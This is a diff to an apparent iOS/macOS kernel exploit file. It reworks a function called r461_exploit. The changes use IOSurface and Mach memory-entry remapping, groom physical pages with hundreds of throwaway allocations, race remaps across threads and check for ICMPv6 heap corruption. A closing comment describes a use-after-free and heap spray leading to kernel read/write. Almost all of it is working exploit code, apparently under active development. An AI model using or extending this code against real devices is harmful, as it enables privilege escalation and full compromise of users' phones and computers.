@@ -17430,20 +17430,51 @@ static void r461_exploit(void) {
     }
     IOSurfaceLock(surf, 0, NULL);
     void *surf_base = IOSurfaceGetBaseAddress(surf);
-    IOSurfaceUnlock(surf, 0, NULL);
     rlog("    Surface base=%p alloc=%zu ID=%u\n", surf_base,
          IOSurfaceGetAllocSize(surf), IOSurfaceGetID(surf));
 
-    /* Phase 4: 3-page remap backing (non-contiguous anonymous memory) */
-    rlog("\n  --- Phase 4: Remap backing (%d pages) ---\n", R461_SURF_PAGES);
+    /* Create surf_entry from IOSurface mapping — preserves PurpleGfxMem VM object */
+    memory_object_size_t surf_memsz = R461_SURF_SZ;
+    mach_port_t surf_entry = MACH_PORT_NULL;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &surf_memsz,
+        (mach_vm_address_t)(uintptr_t)surf_base,
+        VM_PROT_READ | VM_PROT_WRITE, &surf_entry, MACH_PORT_NULL);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    surf_entry=0x%x (kr=%d, memsz=%llu)\n",
+         surf_entry, kr, (unsigned long long)surf_memsz);
+
+    /* Phase 4: Remap backing with FORCED non-contiguous pages */
+    rlog("\n  --- Phase 4: Remap backing (%d pages, forced non-contiguous) ---\n", R461_SURF_PAGES);
     fflush(stdout);
     mach_vm_address_t remap_backing = 0;
-    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R461_SURF_SZ, VM_FLAGS_ANYWHERE);
-    /* Fill each page with distinct pattern to detect contiguity */
-    uint8_t *rb = (uint8_t *)remap_backing;
-    memset(rb, 0xBB, R461_PAGE_SZ);
-    memset(rb + R461_PAGE_SZ, 0xCC, R461_PAGE_SZ);
-    memset(rb + 2 * R461_PAGE_SZ, 0xDD, R461_PAGE_SZ);
+    kr = mach_vm_allocate(mach_task_self(), &remap_backing, R461_SURF_SZ, VM_FLAGS_ANYWHERE);
+
+    /* Fault page 0 */
+    memset((void *)remap_backing, 0xBB, R461_PAGE_SZ);
+    /* Consume free physical pages to force page 1 to be non-contiguous */
+    #define R461_TRASH_PAGES 200
+    mach_vm_address_t trash1[R461_TRASH_PAGES];
+    for (int i = 0; i < R461_TRASH_PAGES; i++) {
+        trash1[i] = 0;
+        mach_vm_allocate(mach_task_self(), &trash1[i], R461_PAGE_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)trash1[i], 0xFF, R461_PAGE_SZ);
+    }
+    /* Fault page 1 */
+    memset((void *)(remap_backing + R461_PAGE_SZ), 0xCC, R461_PAGE_SZ);
+    /* More trash to separate page 2 */
+    mach_vm_address_t trash2[R461_TRASH_PAGES];
+    for (int i = 0; i < R461_TRASH_PAGES; i++) {
+        trash2[i] = 0;
+        mach_vm_allocate(mach_task_self(), &trash2[i], R461_PAGE_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)trash2[i], 0xFF, R461_PAGE_SZ);
+    }
+    /* Fault page 2 */
+    memset((void *)(remap_backing + 2 * R461_PAGE_SZ), 0xDD, R461_PAGE_SZ);
+    /* Free all trash */
+    for (int i = 0; i < R461_TRASH_PAGES; i++) {
+        mach_vm_deallocate(mach_task_self(), trash1[i], R461_PAGE_SZ);
+        mach_vm_deallocate(mach_task_self(), trash2[i], R461_PAGE_SZ);
+    }
 
     memory_object_size_t memsz = R461_SURF_SZ;
     mach_port_t mem_entry = MACH_PORT_NULL;
@@ -17451,15 +17482,6 @@ static void r461_exploit(void) {
         VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL);
     rlog("    Remap backing at 0x%llx, mem_entry=0x%x (memsz=%llu)\n",
          (unsigned long long)remap_backing, mem_entry, (unsigned long long)memsz);
-
-    /* Restore entry for resetting IOSurface mapping between iterations */
-    mach_vm_address_t restore_buf = 0;
-    mach_vm_allocate(mach_task_self(), &restore_buf, R461_SURF_SZ, VM_FLAGS_ANYWHERE);
-    memset((void *)restore_buf, 0xAA, R461_SURF_SZ);
-    memory_object_size_t rsz = R461_SURF_SZ;
-    mach_port_t restore_entry = MACH_PORT_NULL;
-    mach_make_memory_entry_64(mach_task_self(), &rsz, restore_buf,
-        VM_PROT_READ | VM_PROT_WRITE, &restore_entry, MACH_PORT_NULL);
 
     /* Free remaining fragmentation pages */
     for (int i = 0; i < R461_FRAG_PAGES; i += 2) {
@@ -17483,19 +17505,21 @@ static void r461_exploit(void) {
 
     int oob_hits = 0;
     int race_hits = 0;
+    int surf_restore_ok = 0, surf_restore_fail = 0;
     for (int t = 0; t < R461_REMAP_THREADS; t++) ctxs[t].go = 1;
     __sync_synchronize();
 
     for (int iter = 0; iter < R461_ITERS; iter++) {
-        /* Reset IOSurface mapping to restore_entry (0xAA fill) */
+        /* Restore IOSurface PurpleGfxMem mapping (critical for PHYS_CONTIG!) */
         mach_vm_address_t rst = (mach_vm_address_t)(uintptr_t)surf_base;
-        mach_vm_map(mach_task_self(), &rst, R461_SURF_SZ, 0,
+        kern_return_t rkr = mach_vm_map(mach_task_self(), &rst, R461_SURF_SZ, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-            restore_entry, 0, FALSE,
+            surf_entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (rkr == KERN_SUCCESS) surf_restore_ok++;
+        else surf_restore_fail++;
 
         /* Clear file */
-        lseek(fd, 0, SEEK_SET);
         char zp[R461_PAGE_SZ];
         memset(zp, 0x00, sizeof(zp));
         for (int p = 0; p < R461_SURF_PAGES; p++) pwrite(fd, zp, R461_PAGE_SZ, p * R461_PAGE_SZ);
@@ -17581,6 +17605,7 @@ static void r461_exploit(void) {
 
     rlog("\n    Race complete: race_hits=%d, oob_hits=%d / %d iters, remaps=%d\n",
          race_hits, oob_hits, R461_ITERS, total_remaps);
+    rlog("    surf_entry restore: ok=%d fail=%d\n", surf_restore_ok, surf_restore_fail);
 
     /* Phase 6: ICMPv6 corruption check */
     rlog("\n  --- Phase 6: ICMPv6 corruption check ---\n"); fflush(stdout);
@@ -17610,9 +17635,8 @@ static void r461_exploit(void) {
     free(icmp_fds);
     close(fd); unlink(tmppath);
     mach_port_deallocate(mach_task_self(), mem_entry);
-    mach_port_deallocate(mach_task_self(), restore_entry);
+    mach_port_deallocate(mach_task_self(), surf_entry);
     mach_vm_deallocate(mach_task_self(), remap_backing, R461_SURF_SZ);
-    mach_vm_deallocate(mach_task_self(), restore_buf, R461_SURF_SZ);
     CFRelease(surf);
 
     rlog("\n=== r461 complete ===\n");
@@ -17624,6 +17648,7 @@ static void r461_exploit(void) {
     #undef R461_ITERS
     #undef R461_ICMP_SPRAY
     #undef R461_FRAG_PAGES
+    #undef R461_TRASH_PAGES
 }
 
 /* r459: Cross-surface UAF + ICMPv6 heap spray → kernel R/W */
